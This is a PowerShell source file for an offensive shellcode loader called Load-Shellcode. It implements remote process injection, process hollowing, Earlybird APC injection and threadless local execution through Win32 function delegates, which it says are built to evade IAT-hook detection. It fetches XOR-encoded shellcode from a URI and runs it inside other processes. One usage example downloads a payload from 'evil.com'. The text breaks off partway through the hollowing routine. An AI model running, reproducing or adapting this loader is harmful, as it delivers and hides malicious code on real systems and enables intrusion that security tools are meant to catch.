function Load-Shellcode {
#.SYNOPSIS
# Monolithic PowerShell Wrapper for Standalone Shellcode Injection Techniques
# Arbitary Version Number: v0.9.9
# Author: Tyler McCann (@tylerdotrar)
#
#.DESCRIPTION
# These scripts do not utilize Add-Type or any embedded C# -- rather it utilizes custom delegates
# to wrap Win32 function pointers.  This prevents detection via Import Address Table (IAT) hooks.
# Works with both Windows PowerShell and PowerShell Core (Pwsh). Using 64-bit PowerShell sessions
# allows for both 64-bit and 32-bit injection, whereas 32-bit sessions only allow 32-bit injection.
#
# Available Process Injection Methods:
#  |__ Local Process Injection (Threadless Only)
#  |__ Remote Process Injection
#  |__ Process Hollowing
#  |__ Earlybird APC Queue Injection
#
# Note: PPID spoofing technically works, but needs refactoring to be more stable.
#
# Parameters:
#
#   # Injection Technique
#   -LocalInject    -->  Perform threadless local process injection. (alias: -Threadless)
#   -RemoteInject   -->  Perform remote process injection.           (alias: -Remote)
#   -ProcessHollow  -->  Perform process hollowing.                  (alias: -Hollow)
#   -APCInject      -->  Perform Earlybird APC queue injection.      (alias: -Earlybird)
#   
#   # Universal Arguments
#   -Shellcode      -->  Shellcode to execute (can be a byte array, string, filepath, or URI).
#   -XorKey         -->  XOR cipher key for the shellcode (max value: 0xFF).
#   -UseProxy       -->  Attempt to authenticate to the system's default proxy (URI shellcode only).
#   -Debug          -->  Pause execution and shellcode memory address for process attachment.
#   -Help           -->  Return Get-Help information.
#
#   # Technique-specific Arguments
#   -TargetPID      -->  Target process PID to inject into.           (-Remote)
#   -CreateProcess  -->  Process to create and inject with shellcode. (-Hollow/-Earlybird)
#   -ProcessArgs    -->  Pass fake arguments to the created process.  (-Hollow/-Earlybird)
#   -ParentProcess  -->  Name of parent process to attempt to spoof.  (-Hollow/-Earlybird)
#   -ParentPID      -->  PID of parent process to attempt to spoof.   (-Hollow/-Earlybird)
#
# Example Usage:
#  _______________________________________________________________________________________________________
# |                                                                                                       |
# | # Remote inject shellcode file into 'Discord.exe'                                                     |
# | PS> $DiscordPID = (Get-Process -Name Discord).Id | Select -First 1                                    |
# | PS> Load-Shellcode -LocalInject -Shellcode .\calc64.bin -TargetPID $DiscordPID                        |
# |                                                                                                       |
# | # Process hollow 'runtimebroker.exe' with spoofed process arguments                                   |
# | PS> Process-Hollow -Shellcode ./msgbox64.bin -CreateProcess 'runtimebroker' -ProcessArgs '-Embedding' |
# |                                                                                                       |
# | # Earlybird inject 'calc.exe' with XOR encrypted shellcode downloaded from a URI                      |
# | PS> Earlybird-Inject -Shellcode 'https://evil.com/bin' -XorKey 0x69 -CreateProcess 'calc'             |
# |_______________________________________________________________________________________________________|
#
#.LINK
# https://github.com/tylerdotrar/ShellcodeLoaderPS


    Param(
        # Injection Technique
        [Alias('Threadless')]
        [switch]$LocalInject,
        [Alias('Remote')]
        [switch]$RemoteInject,
        [Alias('Hollow')]
        [switch]$ProcessHollow,
        [Alias('Earlybird')]
        [switch]$APCInject,

        # Universal Args
        $Shellcode,
        [UInt32]$XorKey,
        [switch]$UseProxy,
        [switch]$Debug,
        [switch]$Help,

        # Technique-specific Args
        [UInt32]$TargetPID,
        [string]$CreateProcess,
        [string]$ProcessArgs,
        [string]$ParentProcess,
        [UInt32]$ParentPID
    )


    # Return Get-Help information
    if ($Help) { return (Get-Help Load-Shellcode) }


    # Error Correction
    if (!$Shellcode)     { return (Write-Host '[!] Error! Missing shellcode.' -ForegroundColor Red) }
    if ($XorKey -gt 255) { return (Write-Host '[!] Error! XOR key cannot be greater than 0xFF (255).' -ForegroundColor Red) }

    if (!$LocalInject -and !$RemoteInject -and !$ProcessHollow -and !$APCInject) { return (Write-Host '[!] Error! Must specify injection technique.' -ForegroundColor Red) }

    if ($RemoteInject) {
        if (!$TargetPID) { return (Write-Host '[!] Error! Missing target process PID.' -ForegroundColor Red) }
        if (!(Get-Process -Id $TargetPID 2>$NULL)) { return (Write-Host "[!] Error! Unable to find process with PID of '${TargetPID}'." -ForegroundColor Red) }
    }

    if ($ProcessHollow -or $APCInject) {
        if (!$CreateProcess) { return (Write-Host '[!] Error! Missing target process to execute.' -ForegroundColor Red) }
        if (!(Get-Item -LiteralPath $CreateProcess 2>$NULL).FullName -and !(Get-Command -Name $CreateProcess 2>$NULL).Path) {
            return (Write-Host "[!] Error! Unable to locate process '${ProcessName}'." -ForegroundColor Red)
        }
        if ($ParentProcess -or $ParentPID) { $PPIDspoof = $TRUE }
    }


    # Internal Helper Function(s)
    function Format-ByteArray ($Shellcode, [UInt32]$XorKey, [Bool]$UseProxy) {

        # Function Description   : PowerShell Script (mini version) to Convert Multi-Language Shellcode Strings into Byte Arrays
        # Full Version Reference : https://github.com/tylerdotrar/ShellcodeLoaderPS/blob/main/helpers/Format-ByteArray.ps1

        Write-Host '[!] Formatting Shellcode for PowerShell...' -ForegroundColor Yellow

        if ($Shellcode -is [array]) {
            if ($Shellcode -is [Byte[]]) {
                Write-Host ' o  Shellcode parameter is already formatted as a [byte[]].' -ForegroundColor Yellow
                Write-Host ' o  --> No formatting required.'
                $shellcodeBuffer = $Shellcode
            }
            else {
                Write-Host ' o  Shellcode parameter is an [array].'
                Write-Host ' o  --> Converting to [string]...'
                $Shellcode = $Shellcode -join ''
            }
        }

        if ($Shellcode -is [uri]) {
            Write-Host ' o  Shellcode parameter is a [uri].'
            Write-Host " o  --> URI : $($Shellcode.AbsoluteUri)"
            Write-Host ' o  --> Downloading data...'
            Try {
                if ($UseProxy) {
                    $LinkProxy = ([System.Net.WebRequest]::GetSystemWebProxy()).GetProxy($Shellcode.AbsoulteUri)
                    $WebClient = [System.Net.WebClient]::new()
                    $Proxy     = [System.Net.WebProxy]::new()
                    $Proxy.Address = $LinkProxy.AbsoluteUri
                    $Proxy.UseDefaultCredentials = $TRUE
                    $WebClient.Proxy = $Proxy
                    $ShellcodeBuffer = $WebClient.DownloadData($Shellcode.AbsoluteUri)
                }
                else { $ShellcodeBuffer = [System.Net.WebClient]::new().DownloadData($Shellcode.AbsoluteUri) }
            }
            Catch { return (Write-Host '[!] Error! Remote server returned an error!' -ForegroundColor Red) }
        }

        if ($Shellcode -is [String]) {
            $Shellcode = $Shellcode.Replace("`r","").Replace("`n",'')
            if (Test-Path -LiteralPath $Shellcode 2>$NULL) {
                Write-Host ' o  Shellcode [string] is a path to a file.'
                $ShellcodePath   = (Get-Item -LiteralPath $Shellcode).Fullname
                $shellcodeBuffer = [System.IO.File]::ReadAllBytes($ShellcodePath)
                Write-Host " o  --> Path : $ShellcodePath"
                Write-host ' o  --> Reading file bytes...'
            }
            elseif ($Shellcode -match "^(http://|https://)") {
                Write-Host ' o  Shellcode [string] is a URI.'
                Write-Host " o  --> URI : $Shellcode"
                Write-Host ' o  --> Downloading data...'
                Try {
                    if ($UseProxy) {
                        $LinkProxy = ([System.Net.WebRequest]::GetSystemWebProxy()).GetProxy($Shellcode)
                        $WebClient = [System.Net.WebClient]::new()
                        $Proxy     = [System.Net.WebProxy]::new()
                        $Proxy.Address = $LinkProxy.AbsoluteUri
                        $Proxy.UseDefaultCredentials = $TRUE
                        $WebClient.Proxy = $Proxy
                        $ShellcodeBuffer = $WebClient.DownloadData($Shellcode)
                    }
                    else { $ShellcodeBuffer = [System.Net.WebClient]::new().DownloadData($Shellcode) }
                } 
                Catch { return (Write-Host '[!] Error! Remote server returned an error!' -ForegroundColor Red) }
            }
            elseif (($Shellcode -like 'b"\x*') -or ($Shellcode -like '\x*')) {
                Write-Host ' o  Shellcode [string] is formatted for C or Python.'
                Write-Host ' o  --> Formatting for PowerShell...'
                $Shellcode       = $Shellcode.Replace(' ','')
                $psShellcode     = ($Shellcode.Replace('b"','').Replace('"','')).Split('\')[1..$Shellcode.Length]
                $shellcodeBuffer = [byte[]]($psShellcode | % { [convert]::ToByte($_.Replace('x',''),16) })
            }
            elseif (($Shellcode -like '{0x*') -or ($Shellcode -like '{ 0x*')) {
                Write-Host '[!] Formatting Shellcode for PowerShell:' -ForegroundColor Yellow
                Write-Host ' o  Shellcode [string] is formatted for C++ or C#.'
                Write-Host ' o  --> Formatting for PowerShell...'
                $Shellcode       = $Shellcode.Replace(' ','')
                $psShellcode     = ($Shellcode.Replace('{0x','').Replace('}','')) -Split ',0x'
                $shellcodeBuffer = [byte[]]($psShellcode | % { [convert]::ToByte($_,16) })
            }
            else { return (Write-Host '[!] Error! Unable to determine shellcode langauge format.' -ForegroundColor Red) }
        }

        if (!$shellcodeBuffer) { return (Write-Host '[!] Error! Unable to determine shellcode type.' -ForegroundColor Red) }
        Write-Host " o  --> Shellcode Length : $($shellcodeBuffer.Length) bytes"
        
        if ($XorKey) {
            Write-Host '[!] Applying XOR Cipher to Shellcode:' -ForegroundColor Yellow
            Write-Host " o  --> XOR Cipher Key : $('0x{0:X2}' -f ${XorKey}) (${XorKey})"
            for ($i = 0; $i -lt $ShellcodeBuffer.Length; $i++) {
                $ShellcodeBuffer[$i] = $ShellcodeBuffer[$i] -bxor $XorKey
            }
        }

        return ,$shellcodeBuffer
    }
    function Load-Win32Function ([string]$Library, [string]$FunctionName, [type[]]$ParamTypes = @($null), [type]$ReturnType = [Void]) {

        # Function Description   : PowerShell Script (mini version) to Load Win32 Functions into Session via Function Delegates
        # Full Version Reference : https://github.com/tylerdotrar/ShellcodeLoaderPS/blob/main/helpers/Load-Win32Function.ps1

        Try {
            if ($PSVersionTable.PSEdition -eq 'Core') {
                $LibraryHandle   = [System.Runtime.InteropServices.NativeLibrary]::Load($Library)
                if (($LibraryHandle -eq 0)   -or ($LibraryHandle -eq $NULL))   { return (Write-Host "[!] Error! Null handle to target library '${Library}'." -ForegroundColor Red) }
                $FunctionAddress = [System.Runtime.InteropServices.NativeLibrary]::GetExport($LibraryHandle, $FunctionName)
                if (($FunctionAddress -eq 0) -or ($FunctionAddress -eq $NULL)) { return (Write-Host "[!] Error! Unable to find address to target function '${FunctionName}'." -ForegroundColor Red) }
            }
            else {
                $SystemAssembly  = [AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.GlobalAssemblyCache -and ($_.Location -like '*\System.dll') }
                $UnsafeMethods   = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
                $GetModuleHandle = $UnsafeMethods.GetMethod('GetModuleHandle', [type[]]('System.String'))
                $GetProcAddress  = $UnsafeMethods.GetMethod('GetProcAddress',  [type[]]('IntPtr','System.String'))
                $LibraryHandle   = $GetModuleHandle.Invoke($Null, @($Library))
                if (($LibraryHandle -eq 0)   -or ($LibraryHandle -eq $NULL))   { return (Write-Host "[!] Error! Null handle to target library '${Library}'." -ForegroundColor Red) }
                $FunctionAddress = $GetProcAddress.Invoke($Null, @($LibraryHandle, $FunctionName))
                if (($FunctionAddress -eq 0) -or ($FunctionAddress -eq $NULL)) { return (Write-Host "[!] Error! Unable to find address to target function '${FunctionName}'." -ForegroundColor Red) }
            }
        }
        Catch { return Generic-Error }
         
        foreach ($Assembly in [AppDomain]::CurrentDomain.GetAssemblies()) {
            $CustomType = $Assembly.GetType($FunctionName, $False)
            if ($CustomType -ne $NULL) {
                $FunctionDelegate = $CustomType
                break
            }
        }

        if (!$FunctionDelegate) {
            Try {
                $DynAssembly        = [System.Reflection.AssemblyName]::new([guid]::NewGuid().ToString())
                $AssemblyBuilder    = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
                $ModuleBuilder      = $AssemblyBuilder.DefineDynamicModule([guid]::NewGuid().ToString())
                $TypeBuilder        = $ModuleBuilder.DefineType($FunctionName, 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
                $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([Object], [IntPtr])) 
                $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
                $MethodBuilder      = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $ParamTypes)
                $MethodBuilder.SetImplementationFlags('Runtime, Managed')
                $FunctionDelegate   = $TypeBuilder.CreateType()
            }
            Catch { return Generic-Error }
        }

        Write-Host ' o  Function ' -NoNewline ; Write-Host "'${Library}!${FunctionName}()'" -NoNewline -ForegroundColor Green ; Write-Host ' loaded into session.'
        return [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FunctionAddress, $FunctionDelegate)
    }
    function Build-Win32Struct ([string]$StructName, [array]$MembersObject) {

        # Function Description   : PowerShell Script (mini version) to Create Win32 Data Structures in Memory
        # Full Version Reference : https://github.com/tylerdotrar/ShellcodeLoaderPS/blob/main/helpers/Build-Win32Struct.ps1

        foreach ($Assembly in [AppDomain]::CurrentDomain.GetAssemblies()) {
            $CustomType = $Assembly.GetType($StructName, $False)
            if ($CustomType -ne $NULL) { return $CustomType }
        }

        Try {
            $DynAssembly     = [System.Reflection.AssemblyName]::new([guid]::NewGuid().ToString())
            $AssemblyBuilder = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
            $ModuleBuilder   = $AssemblyBuilder.DefineDynamicModule([guid]::NewGuid().ToString())
            $Attributes      = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $TypeBuilder     = $ModuleBuilder.DefineType($StructName, $Attributes, [System.ValueType])
            foreach ($Member in $MembersObject) { [void]$TypeBuilder.DefineField($Member.Name, $Member.Type, 'Public') }
            return $TypeBuilder.CreateType()
        }
        Catch { return Generic-Error }
    }
    function Generic-Error() {
        Write-Host "[!] Unexpected error occured! Return details:" -ForegroundColor Red
        $Error[0]
        $_.Exception | Select-Object -Property ErrorRecord,Source,HResult | Format-List
        $_.InvocationInfo | Select-Object -Property PSCommandPath,ScriptLineNumber,Statement | Format-List
        return
    }
    function Win32-Error() {
        return (Write-Host " o  --> Failure! Last Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" -ForegroundColor Red)
    }
    function Print-Hex ($Integer) {
        return ('0x{0:x}' -f $Integer)
    }

    # Internal Technique Function(s)
    function Local-ProcessInject {
        
        # Function Description   : PowerShell Script (mini version) for Local Process Injection via Delegates
        # Full Version Reference : https://github.com/tylerdotrar/ShellcodeLoaderPS/blob/main/standalone/win32/Local-ProcessInject.ps1

        ### (1) Allocate Memory Buffer & Copy Shellcode ###

        Write-Host '[!] Writing shellcode to local process buffer...' -ForegroundColor Yellow
        Try {
            $ExecPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ShellcodeBuffer.Length)
            [System.RunTime.InteropServices.Marshal]::Copy($ShellcodeBuffer, 0, $ExecPtr, $ShellcodeBuffer.Length)
        }
        Catch { return Generic-Error }

        Write-Host ' o  ' -NoNewLine ; Write-Host '[System.RuntimeInteropServices.Marshal]' -ForegroundColor Green
        Write-Host " o  --> Shellcode copied to address : $(Print-Hex $ExecPtr)"
        Start-Sleep -Seconds 3


        ### (2) Set Buffer Protection to PAGE_EXECUTE_READ (0x20) ###

        Write-Host '[!] Changing memory buffer protection...' -ForegroundColor Yellow

        # VirtualProtect()
        #  > Definition  :  Changes the protection of a region within local process memory.
        #  > Location    :  Kernel32.dll
        #  > Reference   :  https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect

        # Argument(s)
        $lpAddress      = $ExecPtr                              # Pointer to the starting address in memory to change.
        $dwSize         = $ShellcodeBuffer.Length               # Size of the target memory buffer in bytes
        $flNewProtect   = $MemoryProtection.PAGE_EXECUTE_READ   # Memory protection flags for the specified region.
        $lpflOldProtect = 0                                     # Output variable to receive old memory protection flags.
    
        Write-Host ' o  ' -NoNewline; Write-Host 'VirtualProtect()' -ForegroundColor Green

        Try   { $Success = $VirtualProtect.Invoke($lpAddress, $dwSize, $flNewProtect, [ref]$lpflOldProtect) }
        Catch { return Generic-Error }

        if (!$Success) { return Win32-Error }
        Write-Host ' o  --> Memory protection : 0x20 (PAGE_EXECUTE_READ)'
        Start-Sleep -Seconds 3


        # Optional: Debug Mode to Attach to Process

        if ($Debug) {
        
            $TargetProcess = Get-Process -Id $PID

            Write-Host "[x] Debug: " -NoNewline -ForegroundColor Magenta
            Write-Host 'Attach to the ' -NoNewline ; Write-Host "'$($TargetProcess.ProcessName)' ($($TargetProcess.Id))" -ForegroundColor Green -NoNewline ; Write-Host ' instance.'
            Write-Host ' o  --> Shellcode located at address : ' -NoNewline ; Write-Host $(Print-Hex $ExecPtr) -ForegroundColor Green
            Write-Host ' o  --> ' -NoNewline ; Write-Host 'PRESS ENTER TO EXECUTE SHELLCODE.' -ForegroundColor Red -NoNewline
            $NULL = Read-Host
        }
       

        # Step 3: Execution of Shellcode Buffer


        if ($Threadless) {

            Write-Host '[!] Executing shellcode (the current process will die)...' -ForegroundColor Yellow

            # CallWindowProcW()
            #  > Definition  :  Passes message information to the specified window procedure.
            #  > Location    :  User32.dll
            #  > Reference   :  https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-callwindowprocw
            #  > Reference   :  https://isc.sans.edu/diary/32238

            # Argument(s)
            $lpPrevWndFunc = $ExecPtr         # Pointer to previous window procedure (i.e., executable shellcode memory address)
            $hWnd          = [IntPtr]::Zero   # Handle to the window procedure to receive the message
            $Msg           = 0                # Message to process
            $wParam        = 0                # Additional information about the message 
            $lParam        = 0                # Additional information about the message

        
            Write-Host ' o  ' -NoNewline ; Write-Host 'CallWindowProcW()' -ForegroundColor Green

            Try   { $Result = $CallWindowProcW.Invoke($lpPrevWndFunc, $hWnd, $Msg, $wParam, $lParam) }
            Catch { return Generic-Error }

            Write-Host " o  --> Return Value : ${result}" # Process will likely die before getting here, but shellcode should have executed.
        }
    
        else {
        
            Write-Host '[!] Executing shellcode...' -ForegroundColor Yellow

            # CreateThread()
            #  > Definition  :  Create a thread to execute within the address space of the current process.
            #  > Location    :  Kernel32.dll
            #  > Reference   :  https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread

            # Argument(s)
            $lpThreadAtributes = [IntPtr]::Zero        # Pointer to SECURITY_ATTRIBUTES struct                     (i.e., optional and null by default)
            $dwStackSize       = 0                     # Initial size of the stack in bytes                        (i.e., 0 means the new thread uses the default size)
            $lpStartAddress    = $ExecPtr              # Pointer to the memory address to be executed              (i.e., executable shellcode memory address)
            $param             = [IntPtr]::Zero        # Pointer to a variable to be passed to the thread          (i.e., null pointer means none)
            $dwCreationFlags   = 0                     # Creation flags of the thread                              (i.e., 0 means the thread runs immediately after creation)
            $lpThreadId        = 0                     # Pointer to a variable that receives the thread identifier (i.e., 0 for a throwaway variable)

        
            Write-Host ' o  ' -NoNewline ; Write-Host 'CreateThread()' -ForegroundColor Green

            Try   { $thread = $CreateThread.Invoke($hProcess, $lpThreadAtributes, $dwStacksize, $lpStartAddress, $param, $dwCreationFlags, [ref]$lpThreadId) }
            Catch { return Generic-Error }

            if ($Thread -eq 0) { return Win32-Error }
            Write-Host " o  --> Returned Thread : $(Print-Hex $thread)" -NoNewline
        }
    }
    function Remote-ProcessInject {

        # Function Description   : PowerShell Script (mini version) for Remote Process Injection via Delegates
        # Full Version Reference : https://github.com/tylerdotrar/ShellcodeLoaderPS/blob/main/standalone/win32/Remote-ProcessInject.ps1

        ### (1) Acquire handle to the target process ###

        Write-Host "[!] Acquiring handle to target process..." -ForegroundColor Yellow

        # OpenProcess()
        #  > Description : Acquire a handle to process.
        #  > Location    : Kernel32.dll
        #  > Reference   : https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess

        # Argument(s)
        $dwDesiredAccess = $ProcessAccess.PROCESS_ALL_ACCESS  # Desired access rights                (i.e., PROCESS_ALL_ACCESS).
        $bInheritHandle  = $FALSE                       # Created processes inherit the handle (i.e., no -- ignore this).
        $dwProcessId     = $TargetProcess.Id            # Target process to be opened          (i.e., target process PID).
    
        Write-Host ' o  ' -NoNewline ; Write-Host 'OpenProcess()' -ForegroundColor Green

        Try   { $ProcessHandle = $OpenProcess.Invoke($dwDesiredAccess, $bInheritHandle, $dwProcessId) }
        Catch { return Generic-Error }

        if ($ProcessHandle -eq 0) { return Win32-Error }
        Write-Host " o  --> Target Process : $($TargetProcess.ProcessName)"
        Write-Host " o  --> Target PID     : $($TargetProcess.Id)"
        Write-host " o  --> Process Handle : $(Print-Hex $ProcessHandle)"


        ### (2) Allocate memory within target process

        Write-Host "[!] Allocating executable memory within '$($TargetProcess.ProcessName)'..." -ForegroundColor Yellow

        # VirtualAllocEx()
        #  > Definition : Allocates memory within an external process and returns a pointer to said space.
        #  > Location   : Kernel32.dll
        #  > Reference  : https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
    
        # Argument(s)
        $hProcess         = $ProcessHandle                                                   # Handle to the target process (i.e., acquired from OpenProcess).
        $lpAddress        = [IntPtr]::Zero                                                   # Starting address in memory to allocate (i.e., if null this is dynamically determined).
        $dwSize           = $shellcodeBuffer.Length                                          # Size of the memory allocation in bytes.
        $flAllocationType = $MemoryAllocation.MEM_COMMIT -bor $MemoryAllocation.MEM_RESERVE  # Flags for memory allocation type. 
        $flProtect        = $MemoryProtection.PAGE_READWRITE                                 # Memory protection flags for the allocated region.

        Write-Host ' o  ' -NoNewline ; Write-Host 'VirtualAllocEx()' -ForegroundColor Green

        Try   { $TargetAddress = $VirtualAllocEx.Invoke($hProcess, $lpAddress, $dwSize, $flAllocationType, $flProtect) }
        Catch { return Generic-Error }
    
        if ($TargetAddress -eq 0) { return Win32-Error }
        Write-Host " o  --> Allocated Memory Address : $(Print-Hex $TargetAddress)"
        Write-Host " o  --> Memory Block Size        : ${dwSize} bytes"
        Write-Host " o  --> Memory Protection        : 0x04 (PAGE_READWRITE)"
          

        ### (3) Write memory to allocated space

        Write-Host "[!] Writing buffer to allocated memory..." -ForegroundColor Yellow

        # WriteProcessMemory()
        #  > Definition : Write data to an area of memory within a specified process.
        #  > Location   : Kernel32.dll
        #  > Reference  : https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory

        # Argument(s)
        $hProcess               = $ProcessHandle          # Handle to the target process                       (i.e., acquired from OpenProcess).
        $lpBaseAddress          = $TargetAddress          # Starting address in memory to begin writing        (i.e., acquired from VirtualAllocEx).
        $lpBuffer               = $shellcodeBuffer        # Pointer to the memory to copy                      (i.e., target shellcode).
        $nSize                  = $shellcodeBuffer.Length # Size of the memory to copy                         (i.e., size of the shellcode).
        $lpNumberOfBytesWritten = 0                       # Output variable to receive number of bytes written (i.e., essentially a throwaway variable).
    
        Write-Host ' o  ' -NoNewline ; Write-Host 'WriteProcessMemory()' -ForegroundColor Green

        Try   { $MemoryCopied = $WriteProcessMemory.Invoke($hProcess, $lpBaseAddress, $lpBuffer, $nSize, [ref]$lpNumberOfBytesWritten) }
        Catch { return Generic-Error }

        if (!$MemoryCopied) { return Win32-Error }
        Write-Host " o  --> Shellcode Buffer Copied : ${MemoryCopied}"


        ### (4) Make Memory Buffer Executable ###

        Write-Host '[!] Changing memory buffer protection...' -ForegroundColor Yellow

        # VirtualProtectEx()
        #  > Definition  :  Changes the protection of a region of memory within a specified process.
        #  > Location    :  Kernel32.dll
        #  > Reference   :  https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect

        # Argument(s)
        $hProcess       = $ProcessHandle                      # Handle to the target process.   
        $lpAddress      = $TargetAddress                      # Pointer to the starting address in memory to change.
        $dwSize         = $shellcodeBuffer.Length             # Size of the target memory buffer in bytes.
        $flNewProtect   = $MemoryProtection.PAGE_EXECUTE_READ # Memory protection flags for the specified region.
        $lpflOldProtect = 0                                   # Output variable to receive old memory protection flags.

        Write-Host ' o  ' -NoNewline; Write-Host 'VirtualProtectEx()' -ForegroundColor Green

        Try   { $Success = $VirtualProtectEx.Invoke($hProcess, $lpAddress, $dwSize, $flNewProtect, [ref]$lpflOldProtect) }
        Catch { return Generic-Error }

        if (!$Success) { return Win32-Error }
        Write-Host ' o  --> Memory Protection : 0x20 (PAGE_EXECUTE_READ)'


        ### Optional: Debug Mode to Attach to Process

        if ($Debug) {
        
            Write-Host "[x] Debug: " -NoNewline -ForegroundColor Magenta
            Write-Host 'Attach to the ' -NoNewline ; Write-Host "'$($TargetProcess.ProcessName)' ($($TargetProcess.Id))" -ForegroundColor Green -NoNewline ; Write-Host ' instance.'
            Write-Host ' o  --> Shellcode located at address : ' -NoNewline ; Write-Host $(Print-Hex $TargetAddress) -ForegroundColor Green
            Write-Host ' o  --> ' -NoNewline ; Write-Host 'PRESS ENTER TO EXECUTE SHELLCODE.' -ForegroundColor Red -NoNewline
            $NULL = Read-Host
        }



        ### (5) Execute shellcode via a Remote Thread (or local Window Procedure)

        if (!$Threadless) {
        
            Write-Host "[!] Executing shellcode..." -ForegroundColor Yellow

            # CreateRemoteThread()
            #  > Definition  :  Create a thread to execute within the address space of a specfied process.
            #  > Location    :  Kernel32.dll
            #  > Reference   :  https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread

            # Argument(s)
            $hProcess          = $ProcessHandle        # Handle to the target process                              (i.e., acquired from OpenProcess())
            $lpThreadAtributes = [IntPtr]::Zero        # Pointer to SECURITY_ATTRIBUTES struct                     (i.e., optional and null by default)
            $dwStackSize       = 0                     # Initial size of the stack in bytes                        (i.e., 0 means the new thread uses the default size)
            $lpStartAddress    = $TargetAddress        # Pointer to the memory address to be executed              (i.e., executable shellcode memory address)
            $param             = [IntPtr]::Zero        # Pointer to a variable to be passed to the thread          (i.e., null pointer means none)
            $dwCreationFlags   = 0                     # Creation flags of the thread                              (i.e., 0 means the thread runs immediately after creation)
            $lpThreadId        = 0                     # Pointer to a variable that receives the thread identifier (i.e., 0 for a throwaway variable)

            Write-Host ' o  ' -NoNewline ; Write-Host 'CreateRemoteThread()' -ForegroundColor Green

            Try   { $thread = $CreateRemoteThread.Invoke($hProcess, $lpThreadAtributes, $dwStacksize, $lpStartAddress, $param, $dwCreationFlags, [ref]$lpThreadId) }
            Catch { return Generic-Error }

            if ($thread -eq 0) { return Win32-Error }
            Write-Host " o  --> Returned Thread : ${thread}" -NoNewline
        }

        else {

            Write-Host '[!] Executing shellcode (the current process will die)...' -ForegroundColor Yellow

            # CallWindowProcW()
            #  > Definition  :  Passes message information to the specified window procedure.
            #  > Location    :  User32.dll
            #  > Reference   :  https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-callwindowprocw
            #  > Reference   :  https://isc.sans.edu/diary/32238

            # Argument(s)
            $lpPrevWndFunc = $TargetAddress   # Pointer to previous window procedure (i.e., executable shellcode memory address)
            $hWnd          = [IntPtr]::Zero   # Handle to the window procedure to receive the message
            $Msg           = 0                # Message to process
            $wParam        = 0                # Additional information about the message 
            $lParam        = 0                # Additional information about the message

        
            Write-Host ' o  ' -NoNewline ; Write-Host 'CallWindowProcW()' -ForegroundColor Green

            Try   { $Result = $CallWindowProcW.Invoke($lpPrevWndFunc, $hWnd, $Msg, $wParam, $lParam) }
            Catch { return Generic-Error }

            Write-Host " o  --> Return Value : ${result}" # Process will likely die before getting here, but shellcode should have executed.
        }
    }
    function Process-Hollow ($SuspendedProcess) {

        # Function Description   : PowerShell Script (mini version) for Process Hollowing via Delegates
        # Full Version Reference : https://github.com/tylerdotrar/ShellcodeLoaderPS/blob/main/standalone/win32/Process-Hollow.ps1

        ### (1) Create Target Process in a Suspended State ###

        if (!$SuspendedProcess) {
            Write-Host "[!] Creating target process..." -ForegroundColor Yellow

            # CreateProcessA()
            #  > Description : Create a new process and its primary thread.
            #  > Location    : Kernel32.dll
            #  > Reference   : https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa

            # Argument(s)
            $lpApplicationName    = $CreateProcess                            # Full path of the application to be executed.
            $lpCommandLine        = "${CreateProcess} ${ProcessArgs}"         # Command line arguments to be executed  (full path + optional arguments).
            $lpProcessAttributes  = [ref]$ProcessAttributes                   # Pointer to a SECURITY_ATTRIBUTES struct (for the process).
            $lpThreadAttributes   = [ref]$ThreadAttributes                    # Pointer to a SECURITY_ATTRIBUTES struct (for the thread).
            $bInheritHandles      = $False                                    # Boolean for new process to inherit handles from calling process.  
            #$dwCreationFlags      = $ProcessCreation.CREATE_SUSPENDED           # New process creation flags (i.e., create in suspended state).
            $dwCreationFlags      = $ProcessCreation.EXTENDED_STARTUPINFO_PRESENT -bor $ProcessCreation.CREATE_SUSPENDED     # New process creation flags.
            $lpEnvironment        = [IntPtr]::Zero                            # Pointer to the environment block for the new process.
            $lpCurrentDirectory   = $(Split-Path -LiteralPath $CreateProcess) # Full path to the current directory for the process.
            #$lpStartupInfo        = [ref]$StartupInfo                         # Pointer to STARTUPINFOA struct.
            $lpStartupInfo        = [ref]$StartupInfoEx                         # Pointer to STARTUPINFOA struct.
            $lpProcessInformation = [ref]$ProcessInformation                  # Pointer to PROCESS_INFORMATION struct.

            Write-Host ' o  ' -NoNewline ; Write-Host 'CreateProcessA()' -ForegroundColor Green

            Try   { $Success = $CreateProcessA.Invoke($lpApplicationName, $lpCommandLine, $lpProcessAttributes, $lpThreadAttributes, $bInheritHandles, $dwCreationFlags, $lpEnvironment, $lpCurrentDirectory, $lpStartupInfo, $lpProcessInformation) }
            Catch { return Generic-Error }

            if (!$Success) { return Win32-Error }
            $RetProcessInformation = $lpProcessInformation.Value
            Write-Host " o  --> Process Path : ${CreateProcess}"
            Write-Host " o  --> Process PID  : $($RetProcessInformation.dwProcessId)"
        }
        else { $RetProcessInformation = $ProcessInformation.Value }

    
